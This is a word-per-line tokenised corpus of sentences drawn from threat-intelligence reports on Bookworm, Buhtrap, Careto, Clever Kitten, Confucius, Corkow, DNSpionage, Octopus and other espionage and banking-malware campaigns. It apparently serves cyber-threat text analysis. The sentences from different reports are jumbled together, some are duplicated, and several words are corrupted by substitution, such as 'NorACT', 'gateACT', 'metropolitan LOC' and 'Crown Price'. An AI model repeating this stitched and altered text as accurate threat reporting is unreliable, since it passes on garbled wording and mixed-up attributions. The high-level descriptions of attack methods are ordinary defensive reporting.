cryptographic
and
hashing
functions
,
while
others
support
Leader
's
ability
to
communicate
with
its
C2
server
.
 
While
we
did
not
discuss
the
surrounding
attacks
using
Bookworm
in
detail
,
we
have
observed
threat
actors
deploying
Bookworm
primarily
in
attacks
on
targets
in
Thailand
.
 
Also
,
Bookworm
uses
a
combination
of
encryption
and
compression
algorithms
to
obfuscate
the
traffic
between
the
system
and
C2
server
.
 
The
developers
of
Bookworm
have
gone
to
great
lengths
to
create
a
modular
framework
that
is
very
flexible
through
its
ability
to
run
additional
modules
directly
from
its
C2
server
.
 
Unit
42
recently
published
a
blog
on
a
newly
identified
Trojan
called
Bookworm
,
which
discussed
the
architecture
and
capabilities
of
the
malware
and
alluded
to
Thailand
being
the
focus
of
the
threat
actors'
campaigns
.
 
Leader
is
Bookworm
's
main
module
and
controls
all
of
the
activities
of
the
Trojan
,
but
relies
on
the
additional
DLLs
to
provide
specific
functionality
.
 
The
developers
of
Bookworm
use
these
modules
in
a
rather
unique
ACT
,
as
the
other
embedded
DLLs
provide
API
functions
for
Leader
to
carry
out
its
tasks
.
 
Unit
42
does
not
have
detailed
targeting
information
for
all
known
Bookworm
samples
,
but
we
are
aware
of
attempted
attacks
on
at
least
two
branches
of
government
in
Thailand
.
 
We
speculate
that
other
attacks
delivering
Bookworm
were
also
targeting
organizations
in
Thailand
based
on
the
contents
of
the
associated
decoys
documents
,
as
well
as
several
of
the
dynamic
DNS
domain
names
used
to
host
C2
servers
that
contain
the
words
"
Thai
"
or
"
Thailand
"
.
 
We
believe
that
it
is
likely
threat
actors
will
continue
development
Bookworm
,
and
will
continue
to
use
it
for
the
foreseeable
future
.
 
Threat
actors
have
delivered
Bookworm
as
a
payload
in
attacks
on
targets
in
Thailand
.
 
Analysis
of
compromised
systems
seen
communicating
with
Bookworm
C2
servers
also
confirms
our
speculation
on
targeting
with
a
majority
of
systems
existing
within
Thailand
.
 
As
mentioned
in
our
previous
blog
on
Bookworm
,
the
Trojan
sends
a
static
date
string
to
the
C2
server
that
we
referred
to
as
a
campaign
code
.
 
We
believed
that
the
actors
would
use
this
date
code
to
track
their
attack
campaigns
;
however
,
after
continued
analysis
of
the
malware
,
we
think
these
static
dates
could
also
be
a
build
identifier
for
the
Trojan
.
 
Threat
actors
may
use
the
date
string
hardcoded
into
each
Bookworm
sample
as
a
build
identifier
.
 
A
Trojan
sending
a
build
identifier
to
its
C2
server
is
quite
common
,
as
it
notifies
the
threat
actors
of
the
specific
version
of
the
Trojan
in
which
they
are
interacting
.
 
Due
to
these
changes
without
a
new
date
string
,
we
believe
the
date
codes
are
used
for
campaign
tracking
rather
than
a
Bookworm
build
identifier
.
 
We
believe
that
Bookworm
samples
use
the
static
date
string
as
campaign
codes
,
which
we
used
to
determine
the
approximate
date
of
each
attack
that
we
did
not
have
detailed
targeting
information
.
 
Another
decoy
slideshow
associated
with
the
Bookworm
attack
campaign
contains
photos
of
an
event
called
Bike
for
Dad
2015
.
 
The
campaign
code
"
20150920
"
is
associated
with
this
decoy
,
which
is
a
week
prior
to
media
articles
announcing
that
the
Crown
Price
of
Thailand
Maha
Vajiralongkorn
will
lead
the
Bike
for
Dad
2015
event
.
 
Chitpas
is
heavily
involved
with
Thailand
politics
and
was
a
core
leader
of
the
People
's
Committee
for
Absolute
Democracy
(
PCAD
)
,
which
is
an
organization
that
staged
anti-government
campaigns
in
2013
and
2014
.
 
The
final
remaining
known
decoy
includes
photos
of
Chitpas
Tant
Kridakon
(
Figure
7
)
,
who
is
known
as
heiress
to
the
largest
brewery
in
Thailand
.
 
These
images
were
associated
with
the
Bookworm
campaign
code
"
20150905
"
.
 
Unit
42
analyzed
the
systems
communicating
with
the
Bookworm
C2
domains
and
found
that
a
majority
of
the
IP
addresses
existed
within
autonomous
systems
located
in
Thailand
.
 
The
pie
chart
in
Figure
8
shows
that
the
vast
majority
(
73%
)
of
the
hosts
are
geographically
located
in
Thailand
,
which
matches
the
known
targeting
of
this
threat
group
.
 
We
believe
that
the
IP
addresses
from
Canada
,
Russia
and
NorACT
are
analysis
systems
of
antivirus
companies
or
security
researchers
.
 
Overall
,
the
Bookworm
infrastructure
overlaps
with
the
infrastructure
hosting
C2
servers
used
by
various
attack
tools
,
including
FFRAT
,
Poison
Ivy
,
PlugX
,
and
others
.
 
Overall
,
the
Bookworm
infrastructure
overlaps
with
the
infrastructure
hosting
C2
servers
used
by
various
attack
tools
,
including
FFRAT
,
Poison
Ivy
,
PlugX
,
and
others
.
 
Unit
42
enumerated
the
threat
infrastructure
related
to
Bookworm
and
created
a
chart
to
visualize
connected
entities
to
its
current
attack
campaign
.
 
Threat
actors
have
targeted
the
government
of
Thailand
and
delivered
the
newly
discovered
Bookworm
Trojan
since
July
2015
.
 
The
actors
appear
to
follow
a
set
playbook
,
as
the
observed
TTPs
are
fairly
static
within
each
attack
in
this
campaign
.
 
So
far
,
Unit
42
has
seen
infrastructure
overlaps
with
servers
hosting
C2
servers
for
samples
of
the
FFRAT
,
PlugX
,
Poison
Ivy
and
Scieron
Trojans
,
suggesting
that
the
threat
actors
use
these
tools
as
the
payload
in
their
attacks
.
 
The
threat
actors
have
continually
used
Flash
Player
installers
and
Flash
slideshows
for
decoys
.
 
The
vast
majority
of
systems
communicating
with
Bookworm
C2
servers
are
within
the
Bangkok
metropolitan
LOC
where
a
majority
of
the
government
of
Thailand
exists
.
 
Buhtrap
has
been
active
since
2014
,
however
their
first
attacks
against
financial
institutions
were
only
detected
in
August
2015
.
 
At
the
moment
,
the
group
is
known
to
target
Russian
and
Ukrainian
banks
.
 
Buhtrap
is
the
first
hacker
group
using
a
network
worm
to
infect
the
overall
bank
infrastructure
that
significantly
increases
the
difficulty
of
removing
all
malicious
functions
from
the
network
.
 
Malicious
programs
intentionally
scan
for
machines
with
an
automated
Bank-Customer
system
of
the
Central
bank
of
Russia
(
further
referred
to
as
BCS
CBR
)
.
 
If
the
document
was
delivered
with
macros
instead
of
exploits
(
CVE-2012-0158
,
CVE-2013-3906
or
CVE-2014-1761
)
,
then
the
document
contained
instructions
for
enabling
macros
.
 
We
noticed
that
criminals
were
spreading
Buhtrap
using
this
method
from
May
2015
to
August
2015
.
 
It
is
worth
noting
that
attackers
used
the
same
compromised
websites
to
spread
Buhtrap
as
those
that
had
been
used
for
the
Corkow
Trojan
.
 
Moreover
,
they
used
the
same
exploit
kit
Niteris
as
that
in
the
Corkow
case
.
 
Purportedly
during
one
of
the
first
attacks
hackers
intercepted
the
mailing
list
of
the
Anti-drop
"
club
and
created
a
specific
phishing
email
for
its
members
.
 
However
,
it
is
still
widely
used
,
notably
in
Russia
.
 
As
noted
in
our
previous
blog
on
Buhtrap
,
this
gang
has
been
actively
targeting
Russian
businesses
,
mostly
through
spear-phishing
.
 
It
is
thus
interesting
to
see
Buhtrap
add
strategic
web
compromises
to
their
arsenal
.
 
The
first
malware
we
saw
was
the
lurk
downloader
,
which
was
distributed
on
October
26th
.
 
The
executable
would
install
the
real
Ammyy
product
,
but
would
also
launch
a
file
called
either
AmmyyService.exe
or
AmmyySvc.exe
which
contained
the
malicious
payload
.
 
Buhtrap
is
getting
better
at
disguising
the
code
they
inject
into
compromised
websites
.
 
With
the
recent
arrests
of
actors
using
the
Lurk
banking
trojan
,
Buhtrap
appears
to
be
a
likely
alternative
for
actors
wishing
to
target
Russian
banks
and
software
.
 
They
have
different
functions
and
ACTs
of
spreading
,
but
the
same
purpose
to
steal
money
from
the
accounts
of
businesses
.
 
Our
experts
have
found
that
cybercriminals
are
actively
focusing
on
SMBs
,
and
giving
particular
attention
to
accountants
.
 
The
first
encounter
with
Buhtrap
was
registered
back
in
2014
.
 
For
now
,
we
can
call
RTM
one
of
the
most
active
financial
Trojans
.
 
At
that
time
it
was
the
name
of
a
cybercriminal
group
that
was
stealing
money
from
Russian
financial
establishments
to
the
tune
of
at
least
$150,000
per
hit
.
 
Buhtrap
resurfaced
in
the
beginning
of
2017
in
the
TwoBee
campaign
,
where
it
served
primarily
as
means
of
malware
delivery
.
 
After
the
source
codes
of
their
tools
became
public
in
2016
,
the
name
Buhtrap
was
used
for
the
financial
Trojan
.
 
Just
like
last
time
,
Buhtrap
is
spreading
through
exploits
embedded
in
news
outlets
.
 
Estimating
the
damages
is
challenging
,
but
as
we
learned
,
the
criminals
are
siphoning
off
assets
in
transactions
that
do
not
exceed
$15,000
each
.
 
As
explained
later
,
we
believe
this
campaign
is
financially-motivated
and
that
it
targets
accounting
departments
in
Russian
businesses
.
 
"
Buhgalter
"
means
"
accountant
"
in
Russian
.
 
Seeing
a
campaign
like
this
,
inevitably
the
Anunak/Carbanak
documented
by
Fox-IT
and
Kaspersky
comes
to
mind
.
 
The
infection
vector
is
similar
,
it
uses
a
similar
modified
mimikatz
application
,
and
it
uses
a
third-party
remote
access
tool
,
changes
system
settings
to
allow
concurrent
RDP
sessions
,
and
so
on
.
 
The
second
,
aptly
titled
"
kontrakt87.doc
"
,
copies
a
generic
telecommunications
service
contract
from
MegaFon
,
a
large
Russian
mobile
phone
operator
.
 
In
addition
to
built-in
functionalities
,
the
operators
of
Careto
can
upload
additional
modules
which
can
perform
any
malicious
task
.
 
Careto
's
Mask
campaign
we
discovered
relies
on
spear-phishing
e-mails
with
links
to
a
malicious
website
.
 
Sometimes
,
the
attackers
use
sub-domains
on
the
exploit
websites
,
to
make
them
seem
more
legitimate
.
 
These
sub-domains
simulate
sub-sections
of
the
main
newspapers
in
Spain
plus
some
international
ones
like
the
Guardian
and
the
Washington
Post
.
 
The
CVE-2012-0773
was
originally
discovered
by
VUPEN
and
has
an
interesting
story
.
 
In
other
words
,
the
attackers
attracted
our
attention
by
attempting
to
exploit
Kaspersky
Lab
products
.
 
We
initially
became
aware
of
Careto
when
we
observed
attempts
to
exploit
a
vulnerability
in
our
products
to
make
the
malware
"
invisible
"
in
the
system
.
 
Most
modules
were
created
in
2012
.
 
The
attackers
began
taking
them
offline
in
January
2014
.
 
Last
week
we
discussed
Numbered
Panda
,
a
group
that
is
also
based
out
of
China
and
is
fairly
well
known
to
the
security
community
,
though
by
many
names
.
 
We
revealed
a
Chinese-based
adversary
we
crypt
as
Anchor
Panda
,
a
group
with
very
specific
tactics
,
techniques
,
and
procedures
(
TTPs
)
and
a
keen
interest
in
maritime
operations
and
naval
and
aerospace
technology
.
 
The
campaign
was
active
until
January
2014
,
but
during
our
investigations
the
C&C
servers
were
shut
down
.
 
This
week
we
are
going
to
discuss
Clever
Kitten
,
whom
,
by
virtue
of
several
indicators
,
we
have
affiliated
with
the
Islamic
Republic
of
Iran
.
 
Clever
Kitten
has
moved
to
leveraging
strategic
web
compromises
.
 
Clever
Kitten
actors
have
a
strong
affinity
for
PHP
server-side
attacks
to
make
access
;
this
is
relatively
unique
amongst
targeted
attackers
who
often
favor
targeting
a
specific
individual
at
a
specific
organization
using
social
engineering
.
 
Clever
Kitten
primarily
targets
global
companies
with
strategic
importance
to
countries
that
are
contrary
to
Iranian
interests
.
 
A
Clever
Kitten
attack
starts
with
the
use
of
a
web
vulnerability
scanner
to
conduct
reconnaissance
.
 
The
scanner
was
identified
as
the
Acunetix
Web
Vulnerability
Scanner
which
is
a
commercial
penetration
testing
tool
that
is
readily
available
as
a
14-day
trial
.
 
Once
an
exploitable
page
is
identified
,
Clever
Kitten
will
attempt
to
upload
a
PHP
backdoor
to
gain
remote
access
to
the
system
.
 
The
reason
for
this
is
likely
the
availability
of
exploits
against
web
browsers
,
which
for
a
variety
of
reasons
allows
an
attacker
to
bypass
security
features
such
as
Data
Execution
Prevention
(
DEP
)
or
Address
Space
Layout
Randomization
(
ASLR
)
.
 
Once
an
exploitable
page
is
identified
,
the
actor
will
attempt
to
upload
a
PHP
backdoor
to
gain
remote
access
to
the
system
.
 
In
Clever
Kitten
's
attacks
,
the
goal
is
lateral
movement
;
this
is
an
attempt
to
move
further
into
the
target
environment
in
order
to
begin
intelligence
collection
.
 
This
activity
is
a
longer
tail
for
the
actor
than
a
spearphish
;
this
is
likely
based
on
the
Clever
Kitten
background
,
which
may
be
focused
on
web
development/application
testing
.
 
Without
going
too
deep
into
the
rabbit
hole
,
there
are
several
indicators
pointing
to
an
Iranian
nexus
,
including
language
artifacts
in
the
tool-marks
used
by
the
attacker
,
as
well
as
network
activity
tying
this
actor
to
a
very
specific
location
that
we
have
high
confidence
in
not
being
spoofed
.
 
Clever
Kitten
's
goal
is
to
eventually
be
able
to
masquerade
as
a
legitimate
user
by
compromising
credentials
either
through
a
pass-the-hash
attack
,
or
by
dumping
password
hashes
from
a
compromised
host
.
 
The
campaign
targets
Middle
Eastern
organizations
largely
from
the
Lebanon
and
United
Arab
Emirates
,
though
,
Indian
and
Canadian
companies
with
interests
in
those
Middle
Eastern
countries
are
also
targeted
.
 
There
are
new
TTPs
used
in
this
attack
for
example
Agent_Drable
is
leveraging
the
Django
Python
framework
for
command
and
control
infrastructure
,
the
technical
details
of
which
are
outlined
later
in
the
blog
.
 
n
summary
,
Cold
River
is
a
sophisticated
threat
actor
making
malicious
use
of
DNS
tunneling
for
command
and
control
activities
,
compelling
lure
documents
,
and
previously
unknown
implants
.
 
Some
of
the
exploit
server
paths
contain
modules
that
appear
to
have
been
designed
to
infect
Linux
computers
,
but
we
have
not
yet
located
the
Linux
backdoor
.
 
The
campaign
targets
Middle
Eastern
organizations
largely
from
the
Lebanon
and
United
Arab
Emirates
,
though
,
Indian
and
Canadian
companies
with
interests
in
those
Middle
Eastern
countries
may
have
also
been
targeted
.
 
The
decoy
documents
used
by
the
InPage
exploits
suggest
that
the
targets
are
likely
to
be
politically
or
militarily
motivated
.
 
The
use
of
InPage
as
an
attack
vector
is
not
commonly
seen
,
with
the
only
previously
noted
attacks
being
documented
by
Kaspersky
in
late
2016
.
 
The
decoy
documents
dropped
suggest
that
the
targets
are
likely
to
be
politically
or
militarily
motivated
,
with
subjects
such
as
Intelligence
reports
and
political
situations
being
used
as
lure
documents
.
 
While
documents
designed
to
exploit
the
InPage
software
are
rare
,
they
are
not
new
however
in
recent
weeks
Unit42
has
observed
numerous
InPage
exploits
leveraging
similar
shellcode
,
suggesting
continued
use
of
the
exploit
previously
discussed
by
Kaspersky
.
 
Confucius
targeted
a
particular
set
of
individuals
in
South
Asian
countries
,
such
as
military
personnel
and
businessmen
,
among
others
.
 
Tweety
Chat
's
Android
version
can
record
audio
,
too
.
 
Confucius'
operations
include
deploying
bespoke
backdoors
and
stealing
files
from
their
victim
's
systems
with
tailored
file
stealers
,
some
of
which
bore
resemblances
to
Patchwork
's
.
 
Compared
to
Patchwork
,
whose
Trojanized
documents
exploit
at
least
five
security
flaws
,
Confucius'
backdoors
are
delivered
through
Office
files
exploiting
memory
corruption
vulnerabilities
CVE-2015-1641
and
CVE-2017-11882
.
 
Back
in
February
,
we
noted
the
similarities
between
the
Patchwork
and
Confucius
groups
and
found
that
,
in
addition
to
the
similarities
in
their
malware
code
,
both
groups
primarily
went
after
targets
in
South
Asia
.
 
Back
in
February
,
Trend
Micro
noted
the
similarities
between
the
Patchwork
and
Confucius
groups
and
found
that
,
in
addition
to
the
similarities
in
their
malware
code
,
both
groups
primarily
went
after
targets
in
South
Asia
.
 
One
of
its
file
stealers
,
swissknife2
,
abuses
a
cloud
storage
service
as
a
repository
of
exfiltrated
files
.
 
During
the
months
that
followed
in
which
we
tracked
Confucius'
activities
,
we
found
that
they
were
still
aiming
for
Pakistani
targets
.
 
During
their
previous
campaign
,
we
found
Confucius
using
fake
romance
websites
to
entice
victims
into
installing
malicious
Android
applications
.
 
Periodically
,
the
malware
tries
to
contact
the
command-and-control
(
C&C
)
server
with
the
username
encoded
into
parameters
.
 
This
function
is
similar
to
the
various
versions
of
backdoors
(
such
as
sctrls
and
sip_telephone
)
that
we
analyzed
in
our
previous
blog
post
and
whitepaper
.
 
This
algorithm
was
previously
discussed
by
security
researchers
in
a
Confucius-related
blog
post
.
 
Lately
,
Patchwork
has
been
sending
multiple
RTF
files
exploiting
CVE-2017-8570
.
 
The
group
still
uses
the
Badnews
malware
,
a
backdoor
with
information-stealing
and
file-executing
capabilities
,
albeit
updated
with
a
slight
modification
in
the
encryption
routine
at
the
end
of
2017
,
when
they
added
Blowfish
encryption
on
top
of
their
custom
encryption
described
in
our
former
Patchwork
blogpost
.
 
Threat
actors
like
Confucius
and
Patchwork
are
known
for
their
large
arsenal
of
tools
and
ever-evolving
techniques
that
can
render
traditional
security
solutions
which
are
often
not
designed
to
handle
the
persistent
and
sophisticated
threats
detailed
in
this
blog
ineffective
.
 
The
reality
is
that
IT
departments
of
small
to
large-sized
organizations
are
not
equipped
to
handle
the
more
advanced
threats
that
groups
like
Confucius
use
in
their
attacks
.
 
Patchwork
uses
email
as
an
entry
point
,
which
is
why
securing
the
email
gateACT
is
important
.
 
This
blog
post
examines
two
similar
malware
families
that
utilize
the
aforementioned
technique
to
abuse
legitimate
websites
,
their
connections
to
each
other
,
and
their
connections
to
known
espionage
campaigns
.
 
In
order
to
increase
the
likelihood
of
their
malware
successfully
communicating
home
,
Cyber
Espionage
threat
actors
are
increasingly
abusing
legitimate
web
services
,
in
lieu
of
DNS
lookups
to
retrieve
a
command
and
control
address
.
 
In
2013
,
Rapid7
reported
on
a
series
of
relatively
amateur
attacks
against
Pakistani
targets
.
 
The
first
of
which
we
call
'
CONFUCIUS_A
'
,
a
malware
family
that
has
links
to
a
series
of
attacks
associated
with
a
backdoor
attack
method
commonly
known
as
SNEEPY
(
aka
ByeByeShell
)
first
reported
by
Rapid7
in
2013
.
 
At
first
glance
CONFUCIUS_B
looks
very
similar
to
CONFUCIUS_A
,
and
they
are
also
packaged
in
plain
SFX
binary
files
.
 
The
CONFUCIUS_B
executable
is
disguised
as
a
PowerPoint
presentation
,
using
a
Right-To-Left-Override
(
RTLO
)
trick
and
a
false
icon
.
 
We
also
believe
that
both
clusters
of
activity
have
links
to
attacks
with
likely
Indian
origins
,
the
CONFUCIUS_A
attacks
are
linked
to
the
use
of
SNEEPY/BYEBYESHELL
and
the
CONFUCIUS_B
have
a
loose
link
to
Hangover
.
 
The
two
malware
families
themselves
are
also
very
similar
,
and
therefore
we
think
that
the
shared
technique
is
an
indication
of
a
single
developer
,
or
development
company
,
behind
both
CONFUCIUS_A
and
CONFUCIUS_B
.
 
In
this
blog
post
,
we
discussed
two
separate
malware
variations
that
behave
in
very
similar
ACTs
and
use
similar
techniques
to
acquire
a
C2
address
,
with
both
using
Yahoo
Answers
and
Quora
to
evade
traditional
mechanisms
for
blocking
command
and
control
domains
.
 
The
Android
version
,
for
instance
,
can
steal
SMS
messages
,
accounts
,
contacts
,
and
files
,
as
well
as
record
audio
.
 
Confucius'
backdoors
are
delivered
through
Office
documents
exploiting
memory
corruption
vulnerabilities
CVE-2015-1641
and
CVE-2017-11882
.
 
We
dove
deeper
into
Confucius'
operationsnamely
,
the
malware-ridden
documents
,
backdoors
,
and
file
stealers
they
use
in
their
campaigns
.
 
The
sctrls
backdoor
we
came
across
is
delivered
via
RTF
files
exploiting
CVE-2015-1641
.
 
The
documents
that
exploit
CVE2017-11882
download
another
payload
an
HTML
Application
(
HTA
)
file
toting
a
malicious
Visual
Basic
(
VBS
)
script
from
the
server
,
which
is
executed
accordingly
by
the
command-line
tool
mshta.exe
.
 
In
August
2015
a
new
incident
related
to
the
Corkow
(
Metel
)
Trojan
was
detected
.
 
Corkow
provided
remote
access
to
the
ITS-Broker
system
terminal
by
Platforma
soft
Ltd.
,
which
enabled
the
fraud
to
be
committed
.
 
According
to
our
statistics
,
as
of
the
beginning
of
2015
this
botnet
encompassed
over
250
000
infected
devices
worldwide
including
infecting
more
than
100
financial
institutions
with
80%
of
them
from
the
top
20
list
.
 
The
interest
among
hackers
in
targeting
trading
systems
is
expected
to
grow
.
 
Russian-speaking
hackers
are
believed
to
be
responsible
for
these
attacks
and
used
the
Corkow
Trojan
.
 
Hackers
target
primarily
companies
in
Russia
and
CIS
countries
,
though
it
is
noticed
that
the
amount
of
attacks
targeting
the
USA
has
increased
5
times
since
2011
.
 
One
of
the
first
botnets
specializing
in
targeting
the
trading
software
called
Quik
was
"
Ranbyus
"
,
created
in
2012
.
 
As
of
the
Group-IB
investigation
of
this
malware
program
in
March
2015
,
Corkow
v.7.118.1.1
had
not
been
detected
by
a
single
antivirus
program
.
 
Hackers
gained
access
to
a
computer
in
the
trading
system
in
September
2014
.
 
Starting
in
December
2014
,
the
criminal
group
began
running
keyloggers
in
the
infected
system
.
 
To
spread
the
Corkow
malware
criminals
use
a
drive-by
downloads
method
,
when
victims
are
infected
while
visiting
compromised
legitimate
websites
.
 
Group-IB
specialists
detected
various
sites
used
by
criminals
to
spread
the
Trojan
:
mail
tracking
websites
,
news
portals
,
electronic
books
,
computer
graphics
resources
,
music
portals
,
etc
.
 
Hackers
use
the
exploits
"
Nitris
Exploit
Kit
"
(
earlier
known
as
CottonCastle
)
,
which
is
not
available
in
open
sources
and
sold
only
to
trusted
users
.
 
Group-IB
Bot-trek
TDS
sensors
are
in
place
at
a
number
of
financial
institutions
and
,
unfortunately
,
we
register
that
currently
Corkow
malware
is
present
on
80%
of
protected
corporate
systems
.
 
Considering
the
Trojan
delivery
method
and
through
our
analysis
of
infections
on
banks'
networks
,
we
can
confirm
that
all
infections
were
conducted
on
a
random
basis
.
 
According
to
statistics
,
Corkow
primarily
targets
users
in
Russia
and
the
CIS
,
but
it
is
worth
noting
that
in
2014
the
amount
of
attacks
targeting
the
USA
increased
by
5
times
,
in
comparison
with
2011
.
 
Moreover
,
the
number
of
Corkow
incidents
detected
in
Q1
2015
in
the
United
States
exceeds
the
number
of
those
in
the
CIS
countries
.
 
Moreover
,
the
number
of
Corkow
incidents
detected
in
Q1
2015
in
the
United
States
exceeds
the
number
of
those
in
the
CIS
countries
.
 
Hackers
first
actively
spread
bots
using
the
Niteris
exploit
,
and
then
search
for
infected
devices
at
banks
amongst
their
bots
by
analyzing
IP
addresses
,
cracked
passwords
and
results
of
the
modules
performance
.
 
In
addition
to
the
legitimate
AmmyAdmin
tool
,
the
hackers
used
Visconti
Backdoor
developed
based
on
legitimate
RMS
(
remote
manipulator
system
)
software
.
 
If
a
bot
was
installed
on
a
network
that
was
of
interest
to
the
hacking
group
,
this
bot
was
then
used
to
upload
one
of
the
remote
access
programs
.
 
To
obtain
logins
and
passwords
they
applied
keyloggers
built
into
Corkow
,
as
well
as
a
commonly
used
feature
of
Mimikatz
,
dumping
clear
text
Windows
credentials
from
LSA
.
 
Hackers
used
the
remote
access
to
detect
servers
of
their
interest
in
the
internal
network
.
 
In
2015
,
the
Metel
gang
began
to
target
banks
and
financial
institutions
directly
.
 
Metel
is
a
banking
Trojan
(
also
known
as
Corkow
)
discovered
in
2011
when
it
was
used
to
attack
users
of
online
banking
services
.
 
After
the
infection
stage
,
criminals
move
laterally
with
the
help
of
legitimate
and
pentesting
tools
,
stealing
passwords
from
their
initial
victims
(
entry
point
)
to
gain
access
to
the
computers
within
the
organization
that
have
access
to
money
transactions
.
 
With
this
level
of
access
,
the
gang
has
been
able
to
pull
off
a
clever
trick
by
automating
the
rollback
of
ATM
transactions
.
 
COVELLITE
operates
globally
with
targets
primarily
in
Europe
,
East
Asia
,
and
North
America
.
 
US
targets
emerged
in
September
2017
with
a
small
,
targeted
phishing
campaign
directed
at
select
U.S.
electric
companies
.
 
LAZARUS
GROUP
is
responsible
for
attacks
ranging
from
the
2014
attack
on
Sony
Pictures
to
a
number
of
Bitcoin
heists
in
2017
.
 
Technical
analysis
of
COVELLITE
malware
indicates
an
evolution
from
known
LAZARUS
toolkits
.
 
COVELLITE
remains
active
but
appears
to
have
abandoned
North
American
targets
,
with
indications
of
activity
in
Europe
and
East
Asia
.
 
Given
the
group
's
specific
interest
in
infrastructure
operations
,
rapidly
improving
capabilities
,
and
history
of
aggressive
targeting
,
Dragos
considers
this
group
a
primary
threat
to
the
ICS
industry
.
 
Delivering
a
backdoor
and
spyware
,
this
campaign
was
designed
to
steal
information
from
infected
systems
using
a
malware
client
capable
of
filtering
out
"
uninteresting
"
files
,
and
spread
primarily
via
a
targeted
phishing
email
usually
promising
a
pornographic
video
.
 
Lookout
researchers
have
discovered
a
new
mobile
surveillanceware
family
,
FrozenCell
.
 
The
threat
is
likely
targeting
employees
of
various
Palestinian
government
agencies
,
security
services
,
Palestinian
students
,
and
those
affiliated
with
the
Fatah
political
party
.
 
Delivering
a
backdoor
and
spyware
,
Desert
Falcons
's
campaign
was
designed
to
steal
information
from
infected
systems
using
a
malware
client
capable
of
filtering
out
"
uninteresting
"
files
,
and
spread
primarily
via
a
targeted
phishing
email
usually
promising
a
pornographic
video
.
 
FrozenCell
is
the
mobile
component
of
a
multi-platform
attack
we've
seen
a
threat
actor
known
as
"
Two-tailed
Scorpion/APT-C-23
"
,
use
to
spy
on
victims
through
compromised
mobile
devices
and
desktops
.
 
This
threat
is
another
proof
point
that
attackers
are
clearly
incorporating
the
mobile
device
into
their
surveillance
campaigns
as
a
primary
attack
vector
.
 
Desert
Falcons
is
keenly
aware
of
the
information
they
can
derive
from
these
devices
and
are
using
multi-stage
(
phishing
+
an
executable
)
,
multi-platform
(
Android
+
desktop
)
attacks
to
accomplish
their
spying
.
 
FrozenCell
masquerades
as
fake
updates
to
chat
applications
like
Facebook
,
WhatsApp
,
Messenger
,
LINE
,
and
LoveChat
.
 
For
example
,
the
actors
behind
FrozenCell
used
a
spoofed
app
called
Tawjihi
2016
,
which
Jordanian
or
Palestinian
students
would
ordinarily
use
during
their
general
secondary
examination
.
 
It
appears
the
Desert
Falcons
sent
malicious
executables
though
phishing
campaigns
impersonating
individuals
associated
with
the
Palestinian
Security
Services
,
the
General
Directorate
of
Civil
Defence
-
Ministry
of
the
Interior
,
and
the
7th
Fateh
Conference
of
the
Palestinian
National
Liberation
Front
(
held
in
late
2016
)
.
 
The
titles
and
contents
of
these
files
suggest
that
the
actor
targeted
individuals
affiliated
with
these
government
agencies
and
the
Fatah
political
party
.
 
We
believe
that
this
is
a
new
variant
of
VAMP
,
indicating
that
the
threat
actors
behind
APT-C-23
are
still
active
and
continuously
improving
their
product
.
 
VAMP
targeted
various
types
of
data
from
the
phones
of
victims
:
images
,
text
messages
,
contacts
,
and
call
history
,
among
others
.
 
Recently
,
Trend
Micro
researchers
came
across
a
new
mobile
malware
family
which
we
have
called
GnatSpy
.
 
On
Nov.
27
,
2018
,
Cisco
's
Talos
research
division
published
a
write-up
outlining
the
contours
of
a
sophisticated
cyber
espionage
campaign
it
dubbed
DNSpionage
.
 
Talos
said
the
perpetrators
of
DNSpionage
were
able
to
steal
email
and
other
login
credentials
from
a
number
of
government
and
private
sector
entities
in
Lebanon
and
the
United
Arab
Emirates
by
hijacking
the
DNS
servers
for
these
targets
,
so
that
all
email
and
virtual
private
networking
(
VPN
)
traffic
was
redirected
to
an
Internet
address
controlled
by
the
attackers
.
 
Talos
reported
that
these
DNS
hijacks
also
paved
the
ACT
for
the
attackers
to
obtain
SSL
encryption
certificates
for
the
targeted
domains
(
webmail.finance.gov.lb
)
,
which
allowed
them
to
decrypt
the
intercepted
email
and
VPN
credentials
and
view
them
in
plain
text
.
 
That
changed
on
Jan.
25
,
2019
,
when
security
firm
CrowdStrike
published
a
blog
post
listing
virtually
every
Internet
address
known
to
be
(
ab
)used
by
the
espionage
campaign
to
date
.
 
Working
backwards
from
each
Internet
address
,
I
was
able
to
see
that
in
the
last
few
months
of
2018
the
hackers
behind
DNSpionage
succeeded
in
compromising
key
components
of
DNS
infrastructure
for
more
than
50
Middle
Eastern
companies
and
government
agencies
,
including
targets
in
Albania
,
Cyprus
,
Egypt
,
Iraq
,
Jordan
,
Kuwait
,
Lebanon
,
Libya
,
Saudi
Arabia
and
the
United
Arab
Emirates
.
 
PCH
is
a
nonprofit
entity
based
in
northern
California
that
also
manages
significant
amounts
of
the
world
's
DNS
infrastructure
,
particularly
the
DNS
for
more
than
500
top-level
domains
and
a
number
of
the
Middle
East
top-level
domains
targeted
by
DNSpionage
.
 
This
APT
group
usually
carries
out
target
attacks
against
government
agencies
to
steal
sensitive
information
.
 
In
addition
to
spreading
malware
via
spear
fishing
email
with
Office
attachment
containing
either
vulnerability
or
malicious
macro
,
this
group
is
particularly
good
at
leveraging
malicious
Android
APKs
in
the
target
attacks
.
 
We
named
the
actor
DustSquad
and
have
provided
private
intelligence
reports
to
our
customers
on
four
of
their
campaigns
involving
custom
Android
and
Windows
malware
.
 
In
this
blogpost
we
cover
a
malicious
program
for
Windows
called
Octopus
that
mostly
targets
diplomatic
entities
.
 
We
also
started
monitoring
the
malware
and
,
using
Kaspersky
Attribution
Engine
based
on
similarity
algorithms
,
discovered
that
Octopus
is
related
to
DustSquad
,
something
we
reported
in
April
2018
.
 
From
early
2014
until
December
2018
,
ns0.idm.net.lb
pointed
to
194.126.10.18
,
which
appropriately
enough
is
an
Internet
address
based
in
Lebanon
.
 
Kaspersky
Lab
products
detect
the
Octopus
Trojan
as
Trojan.Win32.Octopus.gen
.
 
Political
entities
in
Central
Asia
have
been
targeted
throughout
2018
by
different
actors
,
including
IndigoZebra
,
Sofacy
(
with
Zebrocy
malware
)
and
most
recently
by
DustSquad
(
with
Octopus
malware
)
.
 
El
Machete
is
one
of
these
threats
that
was
first
publicly
disclosed
and
named
by
Kaspersky
here
.
 
We've
found
that
this
group
has
continued
to
operate
successfully
,
predominantly
in
Latin
America
,
since
2014
.
 
All
attackers
simply
moved
to
new
C2
infrastructure
,
based
largely
around
dynamic
DNS
domains
,
in
addition
to
making
minimal
changes
to
the
malware
in
order
to
evade
signature-based
detection
.
 
In
the
case
of
Octopus
,
DustSquad
used
Delphi
as
their
programming
language
of
choice
,
which
is
unusual
for
such
an
actor
.
 
Targets
included
a
wide
array
of
